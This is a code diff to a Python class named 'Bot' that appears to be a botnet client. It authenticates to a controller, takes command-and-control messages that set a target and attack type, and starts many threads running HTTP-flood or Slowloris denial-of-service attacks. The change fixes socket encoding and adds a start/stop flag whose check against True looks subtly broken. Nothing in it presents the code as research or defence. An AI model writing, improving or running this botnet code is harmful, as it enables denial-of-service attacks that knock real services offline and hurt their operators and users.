@@ -77,27 +77,30 @@ class Bot():
 						elif request[1] == 'success': 
 							self.authenticated = True
 							print(f'authenticated as bot')
-							self.sock.send("getstate:")
+							self.sock.send("getstate:".encode(ENCODING))
 					elif request[0] == 'changeip':                              #did they decide to include port?
 						self.target_address = request[1]
 						print(f'new target received {self.target_address}')
 					elif request[0] == 'changeattk':
 						self.attack_type = int(request[1])
 						print(f'attack type changed to {self.attack_type}')
-					elif request[0] == 'startattk':          
-						self.attacking = True
-						print(f"starting attack {self.attack_type} on target {self.target_address}")
-						if self.attack_type == 1:
-							for _ in range(self.threads):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
-								t = RequestAttack(self.target_address)
-								t.start() #t.join
-								self.active_threads.append(t)
-						if self.attack_type == 2:
-							for _ in range(self.threads):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
-								t = SlowLorisAttack(self.target_address)	
-								t.start() #t.join?
-								self.active_threads.append(t)
-						print(f"attack {self.attack_type} running")
+					elif request[0] == 'startattk':    
+						if request[1] == True:      
+							self.attacking = True
+							print(f"starting attack {self.attack_type} on target {self.target_address}")
+							if self.attack_type == 1:
+								for _ in range(self.threads):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
+									t = RequestAttack(self.target_address)
+									t.start() #t.join
+									self.active_threads.append(t)
+							if self.attack_type == 2:
+								for _ in range(self.threads):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
+									t = SlowLorisAttack(self.target_address)	
+									t.start() #t.join?
+									self.active_threads.append(t)
+							print(f"attack {self.attack_type} running")
+						if request[1] == False:
+							self.attacking = False
 					elif request[0] == 'stopattk':
 						self.attacking = False
 						print('stopping attack')
